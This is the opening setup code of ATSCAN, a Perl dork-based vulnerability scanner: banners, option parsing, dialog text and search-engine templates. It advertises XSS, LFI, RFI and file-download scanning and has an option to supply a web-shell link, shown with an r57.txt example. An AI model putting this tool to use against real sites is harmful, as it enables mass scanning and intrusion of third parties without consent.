#!/usr/bin/perl
use File::Basename;
use FindBin '$Bin';
use strict;
use warnings;
use Term::ANSIColor;
use URI::Escape;
use HTML::Entities;
use HTTP::Request::Common;
use Digest::MD5;
use MIME::Base64;
######################################################################################################################################################################################################
## LICENSE   #########################################################################################################################################################################################
#
#   This software is Copyright (c) 2015 Alisam Technology
#   Tool coded by Ali Mehdioui founder of Alisam Technology.
#
#   This is free software, licensed under:
#   The Artistic License 2.0
#   The Artistic License
#   Copyright (c) 2000-2006, The Perl Foundation.
######################################################################################################################################################################################################
## INTRODUCTION #######################################################################################################################################################################################
#
#   This script is Copyright (c) 2015 Alisam Technology
#   Tool coded by Ali Mehdioui.
#   Script name: Atscan Scanner.
#   Codename: Anon4t.
#   Works in linux platforms. Best Run on Ubuntu 14.04, Kali Linux 2.0, Arch Linux, Fedora Linux, Centos..
#   Windows with perl required!
######################################################################################################################################################################################################
## DESCRIPTION #######################################################################################################################################################################################
#
#   ATSCAN Scanner
#   Tool to scan engines, dorks and sites for commune errors and vulnerabilities.
#   Search engine 
#   XSS scanner. 
#   LFI / ADF scanner.
#   Filter wordpress and Joomla sites in the server. 
#   Find Admin page.
#   Decode / Encode MD5 + Base64.
#   Ports scan. 
#   Scan E-mails in sites. 
#   Use proxy. 
#   Random user agent. 
#   Random proxy. 
#   Scan errors. 
#   Detect Cms.
#   Multiple instant scan. 
#   Extern commands execution.
#   Disponible on BlackArch Linux Platform.
#
#   [::] AUTOR:        Alisam Technology - MEZGUIDA DEVELOPERS --
#   [::] FB:           https://facebook.com/Forces.des.tempetes.marocaines
#   [::] Twitter:      https://twitter.com/AlisamTechno
#   [::] Pastebin      http://http://pastebin.com/u/Alisam_Technology
#   [::] GIT:          https://github.com/AlisamTechnology
#   [::] YOUTUBE:      http://youtube.com/c/AlisamTechnology
#
######################################################################################################################################################################################################
## REQUIREMENT  ######################################################################################################################################################################################
# Requiered libreries
# apt-get install libxml-simple-perl
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## COLORS
my $col="\033[0;30m \033[1;30m \033[0;31m \033[0;32m \033[0;33m \033[1;33m \033[0;34m \033[0;35m \033[0;36m \033[1;36m \033[0;37m \033[1;37m \033[1;34m";
my @c;
if ($^O!~/Win/) { printf "\033c"; @c=split / /, $col; }
else{ system("cls"); $col=" ," x 12; $col.=" "; @c=split /,/, $col; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## INFO PANEL TEXT
my @TT=("TEAM", "TOOL", "PATH", "PERL", "SYST", "ALISAM TECHNOLOGY", "ATSCAN SCANNER", "atscan <args> / Help: atscan [--help | -h | -?] to see examples!", "<option> \/ Help: perl",
"[--help|-h|-?]", "TIMEOUT", "Cannot get IP!", "Random", "No changes have been made!", "14[!] Random not allowed when engines are defined!", "[!] Level not defined or not numeric!",
"[!] You have to set a method: --get or --post!", "[!] You have to validate data post! ex: -v text or --status 200", "No response recieved!", "ifinurl", "is not an IP address!");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## OTHERS DIALOG TEXT
my @OTHERS=("Target", "Exp", "CMD", "MD5", "STRING", "Usage", "found!", "A scan is requiered! EX: --xss | --admin | --lfi ...", "[!] ATSCAN will be removed from your system! [Y/N]:", 
"[!] ATSCAN was moved successfully", "OK! Last", "Discleamer: Using ATSCAN to Attack targets without prior mutual consent is",
"illegal! It is your own responsibility to obey laws! Alisam Technology is", "not linked to any kind of loss or misuse or damage caused by this program!", "REPLC",
"[!] Type C to Continue or O to Exit!: ", "PARAM", "No parameter found!", "You cannot validate two times!", "METHOD");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## USER AUTH
my @AUTH=("Login:", "Incorrect password!", "A password is already assigned! Do you want to remove it ? [y|n]:", "Password successfully removed!",
          "You will set an user password and will be requiered for each use!", "Enter password or press Cotrol+C to cancel", "Password successfully generated!");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SEPARATIONS
sub mtak { my $sn1="_" x 82; print $c[0]."$sn1\n"; }
sub dpoints { my $sn2=":" x 78; print $c[0]."    $sn2\n"; }
sub ptak { my $sn3="-" x 82; print $c[1]."$sn3\n"; }
sub points  { my $sn4="=" x 78; print $c[0]."    $sn4\n"; }
sub ltak { my $sn5="-" x 82; print $c[1]."$sn5\n"; }
sub stak { my $sn6="-" x 78; print $c[1]."    $sn6\n"; }
sub stakScan { my $ee=":" x 70; print $c[0]."$ee\n"; }
my $sp=" " x 11;
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## TOOL VERSION
my ($Version, $logoVersion, $scriptUrl, $logUrl, $ipUrl, $conectUrl);
$Version="11.3";
$logoVersion="V $Version";
$scriptUrl="https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/atscan.pl";
$logUrl="https://raw.githubusercontent.com/AlisamTechnology/ATSCAN/master/version.log";
$ipUrl="http://dynupdate.no-ip.com/ip.php";
$conectUrl="http://www.bing.com";
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DEFINE SCAN LISTS
my ($script, $script_bac, $scriptbash, $scriptPass);
$script=$Bin."/atscan.pl";
$scriptPass=$Bin."/conf.xml";
$script_bac=$Bin."/atscan_bac.pl";
$scriptbash="/usr/bin/atscan";
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ARRAYS LISTS
my (@buildArrays, @dorks, @userArraysList, @exploits, @data, @proxies, @aTsearch, @aTscans, @aTtargets, @aTcopy, @ports, @motor, @motors, @systems)=();
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## DELETE CLEAR LISTS
sub deleteLists {
  (@buildArrays, @dorks, @userArraysList, @exploits, @data, @proxies, @aTsearch, @aTscans, @aTtargets, @aTcopy, @ports, @motor, @motors, @systems)=();
  unlink $script_bac;
}
deleteLists();
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## EXIT 
sub logoff { deleteLists(); exit(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BANNER
sub banner { 
  my @ESLOGAN=("No monopoly for knowledge!", "Virgin!! life will fuck us all!", "! Love Mezguida H4ckers !", "No Pe4ce between systems!", "Do not be 4 bl4ck h4cker!", "! Keep c4lm 4nd love me !",
"You look better today !", "No h4y sistem4 4 s4lvo !!", "When be broken u will hear it!");
  my @LOGO=("
    $c[4]     /\\ ___ /\\ 
    $c[4]    (  o   o  )             $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]    \\  >#<  / 
    $c[4]     /       \\       $c[9]     _  _____ ____   ____    _    _   _ 
    $c[4]    /         \\   ^  $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]   |           | ||  $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]    \\          /-//  $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |
    $c[4]     ///  ///--      $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version",
    "
    $c[4]      . \\\\\\|||/// 
    $c[4]     / \\ ========
    $c[4]     \\ /| O   O | 
    $c[4]      #  \\` _ '/            $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]     (#)   | |   
    $c[4]      #\\/( * * )\\     $c[9]     _  _____ ____   ____    _    _   _  
    $c[4]      #\\/(==*==)/     $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]      #   || ||       $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]     .#---'| |`----.  $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |
    $c[4]     '#---'   `----'  $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version",
    "
    $c[4]      __________
    $c[4]     / ___  ___ \\
    $c[4]    / / @ \\/ @ \\ \\
    $c[4]    \\ \\___/\\___/ /\\         $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]     \\____\\/____/||
    $c[4]     /     /\\\\\\\\\\//  $c[9]     _  _____ ____   ____    _    _   _ 
    $c[4]    |     |\\\\\\\\\\\\    $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]     \\      \\\\\\\\\\\\   $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]       \\______/\\\\\\\\  $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |
    $c[4]        _||_||_      $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version",
    "
    $c[4]   .--,       .--,
    $c[4]  ( (  \\.---./  ) )
    $c[4]   '.__/o   o\\__.'
    $c[4]      {= ^  =}
    $c[4]       >  -  <             $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]      /       \\
    $c[4]     //       \\\\       $c[9]     _  _____ ____   ____    _    _   _ 
    $c[4]    //|   .   |\\\\      $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]    ''\\       /''_.-^  $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]       \\  _  /--'      $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |   
    $c[4]     ___)( )(___       $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version",
    "
    $c[4]        (>\\---/<)
    $c[4]        ,'     `.
    $c[4]       /  q   p  \\
    $c[4]      (  >(_Y_)<  )
    $c[4]      >-' `-' `-<-.
    $c[4]      /  _.== ==.,- \\       $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]     /,    )`  '(    )
    $c[4]    ; `._.'      `--<  $c[9]     _  _____ ____   ____    _    _   _ 
    $c[4]   :     \\        |  ) $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]   \\      )       ;_/  $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]   `._ _/_  ___.'-\\\\\\  $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |
    $c[4]       `--\\\\\\          $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version",
    "
    $c[4]   o       o  
    $c[4]    \\_____/                  $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]    /=O=O=\\   ______ 
    $c[4]   /   ^   \\  \\\\\\\\\\\\\\   $c[9]     _  _____ ____   ____    _    _   _ 
    $c[4]   \\ \\___/ / /\\ ___  \\  $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]    \\_ V _/ /\\ /\\\\\\\\  \\ $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]      \\  \\_/\\ /\\ \@_/  / $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |
    $c[4]       \\____\\__\\_____/  $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version",
    "
    $c[4]      \\\\\\|||/// 
    $c[4]      /=======\\           $c[2]$ESLOGAN[rand @ESLOGAN]
    $c[4]      =__   __=
    $c[4]     =( o) (o )=   $c[9]     _  _____ ____   ____    _    _   _ 
    $c[4]      =   U   =    $c[9]    / \\|_   _/ ___| / ___|  / \\  | \\ | |
    $c[4]      _________    $c[9]   / _ \\ | | \\___ \\| |     / _ \\ |  \\| |
    $c[4]      \\__!|!__/    $c[9]  / ___ \\| |  ___) | |___ / ___ \\| |\\  |
    $c[4]         \\_/       $c[9] /_/   \\_\\_| |____/ \\____/_/   \\_\\_| \\_| $c[3]V $Version"
  );
  print $LOGO[rand @LOGO]."\n"; mtak(); print "\n";
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BAD ARGUMENTS
sub badArgs { banner(); advise(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ARGUMENTS
use Getopt::Long ();
my ($Hstatus, $validText, $WpSites, $JoomSites, $xss, $lfi, $JoomRfi, $WpAfd, $adminPage, $subdomain, $mupload, $mzip, $eMails, $command, $mmd5, $mencode64, $mdecode64, $port, $msites,
$mdom, $Target, $exploit, $p, $tcp, $udp, $full, $proxy, $prandom, $help, $output, $replace, $with, $dork, $mlevel, $unique, $shell, $nobanner, $beep, $ifinurl, $noinfo, $motor, $timeout,
$limit, $checkVersion, $searchIps, $regex, $searchRegex, $noQuery, $ifend, $uninstall, $post, $get, $brandom, $data, $payloads, $mrandom, $content, $pass);
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## OPTIONS
my %OPT;
Getopt::Long::GetOptions(\%OPT, 'status=s'=>\$Hstatus, 'valid|v=s'=>\$validText, 'wp'=>\$WpSites, 'joom'=>\$JoomSites, 'xss'=>\$xss, 'lfi'=>\$lfi, 'joomrfi'=>\$JoomRfi, 'wpafd'=>\$WpAfd,
                         'admin'=>\$adminPage, 'shost'=>\$subdomain, 'upload'=>\$mupload, 'zip'=>\$mzip, 'email'=>\$eMails, 'command|c=s'=>\$command, 'md5=s'=>\$mmd5, 'encode64=s'=>\$mencode64,
                         'decode64=s'=>\$mdecode64, 'port=s'=>\$port, 'sites'=>\$msites, 'host'=>\$mdom, 't=s'=>\$Target, 'exp|e=s'=>\$exploit, 'p=s'=>\$p, 'tcp'=>\$tcp, 'udp'=>\$udp,
                         'full'=> \$full, 'proxy=s'=>\$proxy, 'proxy-random=s'=>\$prandom, 'help|h|?'=>\$help, 'save|s=s'=>\$output, 'replace=s'=>\$replace, 'with=s'=>\$with, 'dork|d=s'=>\$dork,
                         'level|l=s'=>\$mlevel, 'unique'=>\$unique, 'shell=s'=>\$shell, 'nobanner'=>\$nobanner, 'beep'=>\$beep, 'ifinurl=s'=>\$ifinurl, 'noinfo'=>\$noinfo, 'm=s'=>\$motor,
                         'time=s'=>\$timeout, 'limit=s'=>\$limit, 'update'=>\$checkVersion, 'ip'=>\$searchIps, 'regex=s'=>\$regex, 'sregex=s'=> \$searchRegex, 'noquery'=> \$noQuery,
                         'ifend'=>\$ifend, 'uninstall'=> \$uninstall, 'post'=>\$post, 'get'=>\$get, 'b-random'=>\$brandom, 'data=s'=>\$data, 'payload=s'=>\$payloads,
                         'm-random'=>\$mrandom, 'content'=>\$content, 'pass'=>\$pass)
or badArgs();
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CLEAN DIRECTORIES
my $outdir ="$Bin/output";
if (!-d $outdir) { mkdir $outdir, 0755 or die "cannot write in $Bin!"; }
if (defined $output) { unlink "$outdir/$output" if -e "$outdir/$output"; }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## PRINT BANNER
if (!defined $nobanner) { banner(); }
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## USER PASS AUTH
if (-e $scriptPass) {
  use Term::ReadKey;
  open (PSS, $scriptPass);
  while (my $PS=<PSS>) { 
    chomp $PS;    
    print $c[4]."[!] $AUTH[0] ";
    ReadMode 2;
    chomp(my $passwd=ReadLine(0));
    ReadMode 0; 
    $passwd=Digest::MD5->md5_hex($passwd);
    if ($PS ne $passwd) { print $c[2]."\n[!] $AUTH[1]\n"; logoff(); }else{ print "$c[3] OK!\n"; ptak(); }
  }
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SET USER PASS
if (defined $pass) {
  if (-e $scriptPass) {
    print $c[2]."[!] $AUTH[2]$c[10] ";
    my $askMe=<STDIN>;
    chomp ($askMe);
    if($askMe=~/(y|Y)/) {
      chomp $askMe; unlink $scriptPass; print $c[3]."[!] $AUTH[3]\n";
    }else{ logoff(); }       
  }else{
    print $c[4]."\n[!] $AUTH[4]\n".$c[4]."[!] $AUTH[5]:$c[10] ";
    my $ps=<STDIN>;
    chomp ($ps);
    $ps=Digest::MD5->md5_hex($ps);
    printFile($scriptPass, $ps);
    print $c[3]."[!] $AUTH[6]\n";
  } logoff();
}
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MULTIPLE SCAN ARGUMENTS
my @z=($WpSites, $JoomSites, $xss, $lfi, $JoomRfi, $WpAfd, $adminPage, $subdomain, $mupload, $mzip, $searchIps, $eMails, $regex, $port, $data, $command);
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## CMS SCAN TYPES
my @cms=("CMS", "Wordpress", "Joomla", "Textpattern", "SMF", "PhpBB!", "VBulletin", "MyBB", "CloudFlare", "Post Nuke", "Drupal", "ATutor", "Php Nuke", "Moodle", "Adapt Cms", "Silver Stripe",
         "Modx", "XOOPS", "Oscommerce", "PrestaShop", "B2evolution", "Smart Solutions", "Zen Cart", "concrete5", "OpenCart");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ERRORS DIALOG TEXT
my @ErrT=("LFI:", "MYSQL:", "AFD:", "Microsoft:", "Oracle:", "DB2:", "ODBC:", "POSTGRESQL:", "SYBASE:", "BOSSWEB:", "JDBC:", "Java Infinitydb:", "PHP:", "ASP:", "LUA:", "UNDEFINED:", "Mariadb:",
          "Possible Shell:", "ERRORS ", "Permissions\! Failed to write in", "Checking proxy connection via", "INFO:", "New Identity IP",
          "Traying again my solve problem or set timeout --time <time in s>", "Possible errors detected!");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GENERAL DIALOG TEXT
my @DT=("Target\(s\) Found", "No Results Found\!", "Error\! Not a Valid Target\!", "SCAN FINISHED\!", "Unique Result\(s\) Found\!", "No Target list found\!", "[!] No Update found!",
"Tool updeted with success\!", "Can not connect to the server\!", "Exploit\(s\)", "Check Your Connection or Proxy Setting\!", "Your Internet connection seems not active\!",
"Dorks\(s\)", "Results saved in", "Uppss.. Cannot process scan\!", "Possible solutions:", "Target must have protocol [http[s]://].", "Given target file path is not true.",
"Please change list extension to [.txt]!", "You have to set a scan for exploited targets\![xss\|lfi\|...]", "To scan server sites You have to set level [Ex: --level 10]\!",
"Invalid option\! --ifinurl or --unique needs dork search\!", "Invalid option\! [Ex: --replace <value> --with <value>]", "Invalid option\! Ex: t- <ip> --port 80 [--udp | --tcp]",
"COMND", "Invalid options\!", "Min level is 10 [--level >=10]", "Engines: [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all]",
"Tool uses default payloads & validation\! You can use your owns using args!\n    Ex: --exp [payload] -v [string] or --payload [your payloads]", "Some thing wrong!",
"Failed to renew identity with", "Please wait...", "POST", "is an IP [Use\!: -t <ip> --level 20 <opcion>]", "Max Positive results defined by user reached",
"Undefined", "Redirect To: ", "Proxy(s)", "Random engine just when using engine!", "Do you want to update tool?", "You have to set scan level [Ex: --level 10]",
"You have to set shell link! [Ex: http://www.site.co.uk/r57.txt]", "Conflict!! Please change", "file ext to [.txt]!", "found!");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## SCAN DIALOG TEXT
my @DS=("DORK", "INFO", "SERVER", "HTTP", "SCAN", "PAYLD", "EXPLOIT", "PORT", "TYPE", "TARGET", "IP", "PROXY", "VALID", "HTTP/1.1", "EXPLOIT", "GET", "EXTRA", "SHELL", "LEVEL", "OUTPUT",
        "EXT CMD", "TASK", "BING", "GOOGLE", "ASK [com]", "YANDEX [com]", "SOGOU [com]", "BING GOOGLE ASK YANDEX DOGOU", "DEFAULT BING", "ENGINE", "Unique Results", "Ifinurl", "URL REGEX",
        "Validate URL", "Server Sites", "WP sites", "JOOM sites", "Subdomains", "No extra info", "Beep Sound", "Remove Query", "Regex", "Open", "Closed", "Random Proxy", "Tor Proxy", "No Proxy",
        "Range", "Replace", "Vul Param:", "Upload", "External Command", "Update Version", "E-mails", "Encode Base64", "Decode Base64", "Get host", "Pause Mode", "ADMIN", "PORTS", "XSS",
        "LFI", "RFI", "AFD", "TCP", "UDP", "ZIP", "STARTING", "Md5", "Proxy");
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ENGINE LANGUAGES
my @strings=('ar_JO', 'ar_KW', 'ar_LB', 'ar_LY', 'ar_MA', 'ar_OM', 'ar_QA', 'ar_SA', 'ar_SD', 'el_GR', 'el', 'iw_IL', 'iw', 'hi_IN', 'hu_HU', 'hu', 'is_IS', 'is', 'in_ID', 'cs-CZ', 'uk',
             'vi_VN', 'vi', 'en-US', 'sk-SK', 'pt-BR', 'sq_AL', 'sq', 'ar_DZ', 'ar_BH', 'ar_EG', 'ar_IQ', 'be_BY', 'be', 'bg_BG', 'bg', 'ca_ES', 'ca', 'zh_CN', 'zh_HK', 'zh_SG', 'zh_TW',
             'zh', 'hr_HR', 'hr', 'cs_CZ', 'cs', 'da_DK', 'da', 'nl_BE', 'nl_NL', 'nl', 'en_AU', 'en_CA', 'en_IN', 'en_IE', 'en_MT', 'en_NZ', 'en_PH', 'en_SG', 'en_ZA', 'en_GB', 'en_US',
             'en', 'et_EE', 'et', 'fi_FI', 'fi', 'fr_BE', 'fr_CA', 'fr_FR', 'fr_LU', 'fr_CH', 'fr', 'de_AT', 'de_DE', 'de_LU', 'de_CH', 'de', 'el_CY', 'in', 'ga_IE', 'ga', 'it_IT', 'it_CH',
             'it', 'ja_JP', 'ja_JP_JP', 'ja', 'ko_KR', 'ko', 'lv_LV', 'lv', 'lt_LT', 'lt', 'mk_MK', 'mk', 'ms_MY', 'ms', 'mt_MT', 'mt', 'no_NO', 'no_NO_NY', 'no', 'pl_PL', 'pl', 'pt_PT',
             'pt', 'ro_RO', 'ro', 'ru_RU', 'ru', 'sr_BA', 'sr_ME', 'sr_CS', 'sr_RS', 'sr', 'sk_SK', 'sk', 'sl_SI', 'sl', 'es_AR', 'es_BO', 'es_CL', 'es_CO', 'es_CR', 'es_DO', 'es_EC',
             'es_SV', 'es_GT', 'es_HN', 'es_MX', 'es_NI', 'es_PA', 'es_PY', 'es_PE', 'es_PR', 'es_ES', 'es_US', 'es_UY', 'es_VE', 'es', 'sv_SE', 'sv', 'th_TH', 'th_TH_TH', 'th', 'tr_TR',
             'tr', 'uk_UA', 'uk');
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## BROWSER LANGUAGES
my @browserlangs=("af", "am", "ar-SA", "as", "az-Latn", "be", "bg", "bn-BD", "bn-IN", "bs", "ca", "ca-ES-valencia", "cs", "da", "de", "de-DE", "el", "en-CA", "en-GB", "en-IN", "en-AU",
                  "en-US", "es", "es-ES", "es-US", "es-MX", "et", "eu", "fa", "fi", "fil-Latn", "fr", "fr-FR", "fr-CA", "ga", "gd-Latn", "gl", "gu", "ha-Latn", "he", "hi", "hr", "hu", "hy",
                  "id", "ig-Latn", "is", "it", "it-IT", "ja", "ka", "kk", "km", "kn", "ko", "kok", "ku-Arab", "ky-Cyrl", "lb", "lt", "lv", "mi-Latn", "mk", "ml", "mn-Cyrl", "mr", "ms", "mt",
                  "nb", "ne", "nl", "nl-BE", "nn", "nso", "or", "pa", "pa-Arab", "pl", "prs-Arab", "pt-BR", "pt-PT", "qut-Latn", "quz", "ro", "ru", "rw", "sd-Arab", "si", "sk", "sl", "sq",
                  "sr-Cyrl-BA", "sr-Cyrl-RS", "sr-Latn-RS", "sv", "sw", "ta", "te", "tg-Cyrl", "th", "ti", "tk-Latn", "tn", "tr", "tt-Cyrl", "ug-Arab", "uk", "ur", "uz-Latn", "vi", "zh-Hans",
                  "zh-Hant", "zu");
my $browserLang=$browserlangs[rand @browserlangs];
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## GOOGLE DOMAINS
my @googleDomains=("com", "ac", "com.om", "ad", "ae", "com.af", "com.ag", "com.ai", "am", "it.ao", "com.ar", "cat", "as", "at", "com.au", "az", "ba", "com.bd", "be", "bf", "bg", "com.bh",
                   "bi", "bj", "com.bn", "com.bo", "com.br", "bs", "co.bw", "com.by", "com.bz", "ca", "com.kh", "cc", "cd", "cf", "cn", "com.co", "co.nz", "cg", "ch", "ci", "co.ck", "cl", "cm",
                   "co.cr", "com.cu", "cv", "cz", "de", "nu", "dj", "dk", "dm", "com.do", "dz", "no", "com.ec", "ee", "com.eg", "es", "com.et", "com.np", "fi", "com.fj", "fm", "fr", "ga",
                   "nl", "ge", "gf", "gg", "com.gh", "com.gi", "nr", "gl", "gm", "gp", "gr", "com.gt", "com.ni", "gy", "com.hk", "hn", "hr", "ht", "com.ng", "hu", "co.id", "iq", "ie", "co.il",
                   "com.nf", "im", "co.in", "io", "is", "it", "ne", "je", "com.jm", "jo", "co.jp", "co.ke", "com.na", "ki", "kg", "co.kr", "com.kw", "kz", "co.mz", "la", "com.lb", "com.lc",
                   "li", "lk", "com.my", "co.ls", "lt", "lu", "lv", "com.ly", "com.mx", "co.ma", "md", "me", "mg", "mk", "mw", "ml", "mn", "ms", "com.mt", "mu", "mv", "com.pa", "com.pe",
                   "com.ph", "com.pk", "pn", "com.pr", "ps", "pt", "com.py", "com.qa", "ro", "rs", "ru", "rw", "com.sa", "com.sb", "sc", "se", "com.sg", "sh", "si", "sk", "com.sl", "sn", "sm",
                   "so", "st", "com.sv", "td", "tg", "co.th", "tk", "tl", "tm", "to", "com.tn", "com.tr", "tt", "com.tw", "co.tz", "com.ua", "co.ug", "co.uk", "us", "com.uy", "co.uz", "com.vc",
                   "co.ve", "vg", "co.vi", "com.vn", "vu", "ws", "co.za", "co.zm", "co.zw");
my $googleDomain=$googleDomains[rand @googleDomains];
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ID RANDOM
my @Ids=(
"5D4B3C17298B25CC309D9A0951C6BA04", "761446B6C1810068798CA09C88BE0776", "76DE276369845330D17C7CD111A536DD", "A0A6BD56DD1A054B1FF32E7FE3A44D27", "F856B0C416AEBE6E6C7610C3B89B5245",
"88ADADC7E5DB1A344000A6F8C2B0BFA9", "6B815A7FDAF8A283440CD6AEB586CED3", "B6B0770CB0F48619CA0EDE35E451F9E5", "D6EA6D2A00270CA431DD36486EE53F35", "7E84432C6967B7DC0AA29A493A1B8FD0"
);
my $Id=$Ids[rand @Ids];
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MSID RANDOM
my @MsIds=(
"1462902128.39925.22889.22408", "1462902552.15536.22876.27365", "1462902586.95962.22874.20936", "1462902627.17116.22876.27348", "1462902668.37045.20953.58001",
"1462902238.39125.22589.29408", "1462902129.37521.22479.24410", "1462902113.35935.22853.22412", "1462902138.59225.22845.22478", "1462902145.39925.22812.22432",
);
my $MsId=$MsIds[rand @MsIds];
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## FILTER SEARCH RESULTS
my $nolisting="q=|0day|pastebin|\/\/t.co|google.|youtube.|jsuol.com|.radio.uol.|b.uol.|barra.uol.|whowhere.|hotbot.|amesville.|lycos|lygo.|orkut.|schema.|blogger.|bing.|w3.|yahoo.|yimg.|
                creativecommons.org|ndj6p3asftxboa7j.|.torproject.org|.lygo.com|.apache.org|live.|microsoft.|ask.|shifen.com|answers.|analytics.|googleadservices.|sapo.pt|favicon.|
                blogspot.|wordpress.|.css|scripts.js|jquery-1.|dmoz.|gigablast.|aol.|.macromedia.com|.sitepoint.|yandex.|www.tor2web.org|.securityfocus.com|.Bootstrap.|.metasploit.com|
                aolcdn.|altavista.|clusty.|teoma.|baiducontent.com|wisenut.|a9.|uolhost.|w3schools.|msn.|baidu.|hao123.|shifen.|procog.|facebook.|twitter.|flickr.|.adobe.com|oficinadanet.|
                elephantjmjqepsw.|.duckduckgo.io|kbhpodhnfxl3clb4|.scanalert.com|.prototype.|feedback.core|4shared.|.KeyCodeTab|.style.|www\/cache\/i1|.className.|=n.|a.Ke=|Y.config|
                .goodsearch.com|style.top|n.Img|n.canvas.|t.search|Y.Search.|a.href|a.currentStyle|a.style|yastatic.|.oth.net|.hotbot.com|.zhongsou.com|ezilon.com|.example.com|location.href|
                .navigation.|.hostname.|.bingj.com|Y.Mobile.|srpcache?p|stackoverflow.|shifen.|baidu.|baiducontent.|gstatic.|php.net|wikipedia.|webcache.|inurl.|naver.|navercorp.|windows.|
                window.|.devmedia|imasters.|.inspcloud.com|.lycos.com|.scorecardresearch.com|.target.|JQuery.min|Element.location.|document.|exploit-db|packetstormsecurity.|1337day|owasp|
                .sun.com|mobile10.dtd|onabort=function|inurl.com.br|purl.org|.dartsearch.net|r.cb|.classList.|.pt_BR.|github|microsofttranslator.com|.compete.com|.sogou.com|gmail.|blackle.com|
                boorow.com|gravatar.com|cookieSet|security|facebook|WindowsLiveTranslator|cache|74.125.153.132|inurl:|Network|adw.sapo|tripadvisor|yandex|Failed|tumblr.|wiki|inciclopedia.|
                sogoucdn.com|weixin.";
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## MAIL VALIDATION
my $V_EMAIL='((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})';
my $V_IP='((\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3}))';
my $V_RANG='(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})\-(\d{1,3})\.(\d{1,3})\.(\d{1,3})\.(\d{1,3})';
my $V_SEARCH='((https?|ftps?):\/\/([^>\"\<\'\(\)\#\s]*))';
my $V_REGEX=$regex;
my $S_REGEX=$searchRegex;
######################################################################################################################################################################################################
######################################################################################################################################################################################################
## ENGINE MOTORS
my $motor1="http://www.bing.com/search?q=MYDORK&first=MYNPAGES&FORM=PERE&cc=MYBROWSERLANG";
my $motor2="http://www.google.MYGOOGLEDOMAINE/search?q=MYDORK&start=MYNPAGES";
my $motor3="http://www.ask.com/web?q=MYDORK&page=MYNPAGES&qid=MYID";
my $motor4="http://www.yandex.com/search/?msid=MYMSID&text=MYDORK&lr=25402&p=MYNPAGES";
my $motor5="http://www.sogou.com/web?query=MYDORK&page=MYNPAGES&ie=utf8";
my $motorparam="1|2|3|4|5|all";
my @mrands=($motor1, $motor2, $motor3, $motor4, $motor5);
my $mrand=$mrands[rand @mrands];
my @allMotors=($motor1, $motor2, $motor3, $motor4, $motor5);
